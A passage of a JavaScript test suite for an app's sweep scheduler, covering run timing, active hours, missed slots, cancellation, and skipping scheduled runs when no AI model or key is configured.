  assert.ok(elsewhere, 'no zone disagrees with the configured one about the date, which cannot happen');
  const crossZone = recordTokens(db, {
    tokensIn: 5, tokensOut: 5, thought: false, sweep: false, now: nowISO(elsewhere),
  });
  assert.equal(crossZone.tokensIn, 5,
    'a row stamped in another zone must read as a new day — if this ever adds, dayKey stopped '
    + 'deciding the day and recordAskSpend no longer needs to be handed the configured zone');
});

/* ================================================================== *
 * nextRunAt / isActiveHour
 * ================================================================== */

test('nextRunAt adds the interval and keeps the offset', () => {
  const config = baseConfig();
  assert.equal(nextRunAt(config, '2026-08-08T10:00:00+00:00'), '2026-08-08T10:30:00+00:00');
  assert.equal(
    nextRunAt(baseConfig({ sweep: { intervalMinutes: 90, activeHours: [6, 23], auto: true } }), '2026-08-08T10:00:00+00:00'),
    '2026-08-08T11:30:00+00:00',
  );
});

test('nextRunAt waits for the active window rather than sweeping at 3am', () => {
  const config = baseConfig();
  // 22:50 + 30m = 23:20, past the 23:00 close -> tomorrow at 06:00.
  assert.equal(nextRunAt(config, '2026-08-08T22:50:00+00:00'), '2026-08-09T06:00:00+00:00');
  // 04:00 + 30m = 04:30, before the 06:00 open -> this morning at 06:00.
  assert.equal(nextRunAt(config, '2026-08-08T04:00:00+00:00'), '2026-08-08T06:00:00+00:00');
});

test('nextRunAt clamps a nonsense interval instead of trusting it', () => {
  const wild = baseConfig({ sweep: { intervalMinutes: 0, activeHours: [6, 23], auto: true } });
  assert.equal(nextRunAt(wild, '2026-08-08T10:00:00+00:00'), '2026-08-08T10:05:00+00:00');
});

test('isActiveHour reads the hour off the string', () => {
  const config = baseConfig();
  assert.equal(isActiveHour(config, '2026-08-08T10:00:00+00:00'), true);
  assert.equal(isActiveHour(config, '2026-08-08T05:59:00+00:00'), false);
  assert.equal(isActiveHour(config, '2026-08-08T23:00:00+00:00'), false);
});

/* ================================================================== *
 * Scheduler
 * ================================================================== */

const flush = async () => {
  for (let i = 0; i < 6; i++) await new Promise((r) => setImmediate(r));
};

test('the scheduler starts, reports itself, and stops', (t) => {
  const db = fresh();
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: Date.UTC(2026, 7, 8, 10, 0, 0) });

  const scheduler = new Scheduler({ db, config: baseConfig(), run: async () => ({ ok: true }) });
  const idle = scheduler.status();
  assert.equal(idle.running, false);
  assert.equal(idle.nextRunAt, null);

  const started = scheduler.start();
  assert.equal(started.running, true);
  assert.equal(started.intervalMinutes, 30);
  assert.deepEqual(started.activeHours, [6, 23]);
  assert.equal(started.nextRunAt, '2026-08-08T10:30:00+00:00');

  assert.equal(scheduler.start().nextRunAt, '2026-08-08T10:30:00+00:00', 'start is idempotent');

  const stopped = scheduler.stop();
  assert.equal(stopped.running, false);
  assert.equal(stopped.nextRunAt, null);
});

test('the scheduler does not drift, and skips slots it slept through', async (t) => {
  const db = fresh();
  const T0 = Date.UTC(2026, 7, 8, 10, 0, 0);
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: T0 });

  let runs = 0;
  const scheduler = new Scheduler({
    db,
    config: baseConfig(),
    run: async () => { runs += 1; return { ok: true, runId: `r${runs}` }; },
  });
  scheduler.start();
  assert.equal(scheduler.status().nextRunAt, '2026-08-08T10:30:00+00:00');

  // The machine was asleep for 95 minutes: three slots came due.
  t.mock.timers.tick(95 * 60_000);
  await flush();

  assert.equal(runs, 1, 'missed slots are skipped, never queued up');
  assert.equal(
    scheduler.status().nextRunAt,
    '2026-08-08T12:00:00+00:00',
    'and the cadence stays on its original 30-minute grid rather than restarting from now',
  );
  assert.equal(scheduler.status().runs, 1);
  assert.equal(scheduler.status().busy, false);

  t.mock.timers.tick(25 * 60_000);
  await flush();
  assert.equal(runs, 2);
  assert.equal(scheduler.status().nextRunAt, '2026-08-08T12:30:00+00:00');

  scheduler.stop();
});

test('a keychain read completing after stop and restart cannot launch a retired sweep', async (t) => {
  const db = fresh();
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: Date.UTC(2026, 7, 8, 10, 0, 0) });
  let finishKey, runs = 0;
  const scheduler = new Scheduler({ db,
    config: blankModelConfig({ model: { ...DEFAULTS.model, model: 'test-model' } }),
    deps: { getSecret: () => new Promise(resolve => { finishKey = resolve; }) },
    run: async () => { runs++; return { ok: true }; },
  });
  scheduler.start(); t.mock.timers.tick(31 * 60_000); await flush();
  assert.equal(typeof finishKey, 'function');
  assert.equal(scheduler.status().busy, true, 'maintenance must drain the credential read');
  scheduler.stop();
  assert.equal(scheduler.status().busy, true, 'stopping does not hide a pending credential write');
  scheduler.start();
  const next = scheduler.status().nextRunAt;
  finishKey('synthetic-key'); await flush();
  assert.equal(scheduler.status().busy, false, 'the retired preflight has now settled');
  assert.equal(runs, 0, 'no write may begin from the old tick after maintenance');
  assert.equal(scheduler.status().nextRunAt, next, 'the fresh schedule keeps its timer');
  t.mock.timers.tick(30 * 60_000); await flush();
  finishKey('synthetic-key'); await flush();
  assert.equal(runs, 1, 'the new schedule still works');
  scheduler.stop();
});

test('resuming after an outage runs once, reports failure, and recovers on the next slot', async (t) => {
  const db = fresh();
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: Date.UTC(2026, 7, 8, 10, 0, 0) });
  let runs = 0;
  const scheduler = new Scheduler({ db, config: baseConfig(), run: async () => {
    runs++;
    if (runs === 1) throw new Error('Synthetic network outage');
    return { ok: true };
  } });
  scheduler.start(); t.mock.timers.tick(95 * 60_000); await flush();
  assert.equal(runs, 1);
  assert.equal(scheduler.status().busy, false);
  assert.match(scheduler.status().lastResult.error, /network outage/);
  assert.equal(scheduler.status().nextRunAt, '2026-08-08T12:00:00+00:00');
  t.mock.timers.tick(25 * 60_000); await flush();
  assert.equal(runs, 2);
  assert.deepEqual(scheduler.status().lastResult, { ok: true });
  scheduler.stop();
});

test('a config save that does not touch the schedule does not move the next sweep', async (t) => {
  const db = fresh();
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: Date.UTC(2026, 7, 8, 10, 0, 0) });

  let runs = 0;
  const scheduler = new Scheduler({
    db,
    config: baseConfig(),
    run: async () => { runs += 1; return { ok: true }; },
  });
  scheduler.start();
  assert.equal(scheduler.status().nextRunAt, '2026-08-08T10:30:00+00:00');

  // Ten minutes later the accent colour is saved. PUT /api/config hands every
  // save to reconfigure(), and re-anchoring from "now" postponed the next
  // sweep by a fresh interval per save — indefinitely, for a fidgety afternoon
  // of Settings changes, and by most of a day at intervalMinutes 1440.
  t.mock.timers.tick(10 * 60_000);
  scheduler.reconfigure(baseConfig({ ui: { theme: 'ink' } }));
  assert.equal(scheduler.status().nextRunAt, '2026-08-08T10:30:00+00:00',
    'a save that leaves the schedule alone keeps the grid');

  t.mock.timers.tick(21 * 60_000);
  await flush();
  assert.equal(runs, 1, 'and the slot still fires on time');

  // A save that DOES change the schedule re-aims from now, as it always has.
  scheduler.reconfigure(baseConfig({ sweep: { intervalMinutes: 60, activeHours: [6, 23], auto: true } }));
  assert.equal(scheduler.status().nextRunAt, '2026-08-08T11:31:00+00:00');

  scheduler.stop();
});

test('the scheduler honours sweep.auto and active hours without stopping the loop', async (t) => {
  const db = fresh();
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: Date.UTC(2026, 7, 8, 10, 0, 0) });

  let runs = 0;
  const scheduler = new Scheduler({
    db,
    config: baseConfig({ sweep: { intervalMinutes: 30, activeHours: [6, 23], auto: false } }),
    run: async () => { runs += 1; return { ok: true }; },
  });
  scheduler.start();
  assert.equal(scheduler.status().auto, false);

  t.mock.timers.tick(31 * 60_000);
  await flush();
  assert.equal(runs, 0, 'auto:false means the timer keeps time but does not sweep');
  assert.equal(scheduler.status().nextRunAt, '2026-08-08T11:00:00+00:00');

  // Turning it back on must not require a restart — and flipping sweep.auto is
  // not a schedule change, so the timer keeps its grid.
  scheduler.reconfigure(baseConfig());
  assert.equal(scheduler.status().auto, true);
  assert.equal(scheduler.status().nextRunAt, '2026-08-08T11:00:00+00:00');
  scheduler.stop();
});

/** The config a fresh install loads: the Anthropic preset, no model chosen, no key. */
function blankModelConfig(over = {}) {
  return baseConfig({ model: { ...DEFAULTS.model }, ...over });
}

function countRuns(db) {
  return db.prepare('SELECT count(*) AS n FROM runs').get().n;
}

/**
 * REGRESSION. `#tick` gated on `sweep.auto` alone, and `shouldRunFull` says
 * "think" whenever no full run has ever succeeded — which on a home with no
 * model is forever. A default install that skipped setup therefore ran a full
 * sweep every interval, reached `requireKey`, and wrote a failed run row: the
 * operator's own ~/.zelos held 38 of them, one every half hour, with nothing to
 * sweep and nothing to ask, under a red "The last sweep failed" banner whose
 * only offer was to fail again. The scheduled path now asks the question
 * /api/health's `model.configured` asks and stands down — keeping time, and
 * saying why.
 *
 * The real run loop is used on purpose: a fake `run` would pass on the unfixed
 * code too. The key is read through the `getSecret` seam so no keychain is
 * opened, and the missing key is found before any request is built, so no
 * socket is opened either.
 */
test('REGRESSION: a scheduler on a home with no model runs nothing, writes no run row, keeps ticking and says why', async (t) => {
  const db = fresh();
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: Date.UTC(2026, 7, 8, 10, 0, 0) });

  const relayed = [];
  const scheduler = new Scheduler({
    db,
    config: blankModelConfig(),
    deps: { getSecret: async () => null },
    onRun: (r) => relayed.push(r),
  });
  scheduler.start();

  t.mock.timers.tick(31 * 60_000);
  await flush();

  assert.equal(countRuns(db), 0, 'a scheduled sweep with no model must not write a run row');
  assert.equal(relayed.length, 0, 'and must not relay a result the board would paint as a failed sweep');
  const after = scheduler.status();
  assert.equal(after.runs, 0);
  assert.equal(after.busy, false);
  assert.equal(after.nextRunAt, '2026-08-08T11:00:00+00:00', 'the timer keeps its grid');
  assert.equal(after.lastResult?.skipped, true, 'status() must say the slot was skipped, not failed');
  assert.match(after.lastResult?.reason ?? '', /Settings → AI/, 'and say where to go, by the label the tab wears');
  assert.doesNotMatch(after.lastResult?.reason ?? '', /https?:/, 'and never name an address the person did not type');

  // The next slot is the same story: still no row, still on the grid.
  t.mock.timers.tick(30 * 60_000);
  await flush();
  assert.equal(countRuns(db), 0);
  assert.equal(scheduler.status().nextRunAt, '2026-08-08T11:30:00+00:00');

  scheduler.stop();
});

test('the same scheduler starts sweeping once reconfigure() hands it a ready model, without a restart', async (t) => {
  const db = fresh();
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: Date.UTC(2026, 7, 8, 10, 0, 0) });

  let runs = 0;
  const scheduler = new Scheduler({
    db,
    config: blankModelConfig(),
    deps: { getSecret: async () => null },
    run: async () => { runs += 1; return { ok: true }; },
  });
  scheduler.start();

  t.mock.timers.tick(31 * 60_000);
  await flush();
  assert.equal(runs, 0);
  assert.equal(scheduler.status().lastResult?.skipped, true);

  // Settings → Model saved a local runtime; the server hands the new config
  // to the running scheduler exactly as it does for sweep.auto. A model change
  // is not a schedule change, so the timer keeps its grid.
  scheduler.reconfigure(baseConfig());
  assert.equal(scheduler.status().nextRunAt, '2026-08-08T11:00:00+00:00');
  t.mock.timers.tick(31 * 60_000);
  await flush();
  assert.equal(runs, 1, 'a keyless local model is ready, so the next slot sweeps');
  assert.deepEqual(scheduler.status().lastResult, { ok: true }, 'and the skip is no longer the last word');

  scheduler.stop();
});

test('a remote model with no stored key is skipped until the key is pasted, then sweeps', async (t) => {
  const db = fresh();
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: Date.UTC(2026, 7, 8, 10, 0, 0) });

  let stored = null;
  let runs = 0;
  const scheduler = new Scheduler({
    db,
    config: blankModelConfig({ model: { ...DEFAULTS.model, model: 'claude-sonnet-4-5' } }),
    deps: { getSecret: async () => stored },
    run: async () => { runs += 1; return { ok: true }; },
  });
  scheduler.start();

  t.mock.timers.tick(31 * 60_000);
  await flush();
  assert.equal(runs, 0, 'a model name alone is not enough for a remote endpoint');
  // The reason names the missing key and the tab, never the base URL: it is
  // painted on the board, where an address the person did not type reads as
  // the program having gone somewhere on its own.
  assert.match(scheduler.status().lastResult?.reason ?? '', /No key has been saved[^]*Settings → AI/);
  assert.doesNotMatch(scheduler.status().lastResult?.reason ?? '', /api\.anthropic\.com/);

  // The key is pasted under Settings → AI. No reconfigure is needed: the
  // config did not change, the secret store did.
  stored = 'sk-ant-test';
  t.mock.timers.tick(30 * 60_000);
  await flush();
  assert.equal(runs, 1, 'the next slot reads the key and sweeps');

  scheduler.stop();
});

test('a hand-started sweep on the same home still fails loudly, with the real error and its run row', async () => {
  const db = fresh();
  const relayed = [];
  const scheduler = new Scheduler({
    db,
    config: blankModelConfig(),
    deps: { getSecret: async () => null },
    onRun: (r) => relayed.push(r),
  });

  const result = await scheduler.runNow('auto');
  assert.equal(result.ok, false);
  assert.equal(result.skipped, undefined, 'a person who asked is told what went wrong, not that nothing happened');
  assert.match(result.error, /API key|model|No AI has been chosen/i);
  assert.equal(relayed.length, 1, 'the board hears about a sweep the user started');

  assert.equal(countRuns(db), 1);
  const row = db.prepare('SELECT ok, error FROM runs').get();
  assert.equal(row.ok, 0);
  assert.equal(row.error, result.error);
  assert.equal(scheduler.status().runs, 1);
});

test('the scheduler runs on demand and records the result', async (t) => {
  const db = fresh();
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: Date.UTC(2026, 7, 8, 10, 0, 0) });

  const seen = [];
  const scheduler = new Scheduler({
    db,
    config: baseConfig(),
    run: async ({ mode }) => ({ ok: true, mode }),
    onRun: (r) => seen.push(r),
  });
  const result = await scheduler.runNow('full');
  assert.deepEqual(result, { ok: true, mode: 'full' });
  assert.equal(seen.length, 1);
  assert.equal(scheduler.status().runs, 1);
  assert.equal(scheduler.status().lastResult.mode, 'full');
  assert.ok(scheduler.status().lastRunAt);
});

test('the scheduler refuses to run two sweeps at once', async (t) => {
  const db = fresh();
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: Date.UTC(2026, 7, 8, 10, 0, 0) });

  let release;
  const scheduler = new Scheduler({
    db,
    config: baseConfig(),
    run: () => new Promise((resolve) => { release = () => resolve({ ok: true }); }),
  });
  const first = scheduler.runNow();
  await flush();
  const second = await scheduler.runNow();
  assert.deepEqual(second, { ok: false, busy: true, error: 'A sweep is already running' });
  release();
  assert.deepEqual(await first, { ok: true });
  assert.equal(scheduler.status().runs, 1);
});

test('the scheduler survives a sweep that throws', async (t) => {
  const db = fresh();
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: Date.UTC(2026, 7, 8, 10, 0, 0) });

  const scheduler = new Scheduler({
    db,
    config: baseConfig(),
    run: async () => { throw new Error('the disk caught fire'); },
  });
  const result = await scheduler.runNow();
  assert.equal(result.ok, false);
  assert.match(result.error, /disk caught fire/);
  assert.equal(scheduler.status().busy, false);
});

test('the scheduler cancels an in-flight sweep when it is stopped', async (t) => {
  const db = fresh();
  t.mock.timers.enable({ apis: ['setTimeout', 'Date'], now: Date.UTC(2026, 7, 8, 10, 0, 0) });

  let sawAbort = false;
  const scheduler = new Scheduler({
    db,
    config: baseConfig(),
    run: ({ signal }) =>
      new Promise((resolve) => {
        signal.addEventListener('abort', () => {
          sawAbort = true;
          resolve({ ok: false, error: 'cancelled' });
        });
      }),
  });
  const pending = scheduler.runNow();
  await flush();
  scheduler.stop();
  await pending;
  assert.equal(sawAbort, true);
});
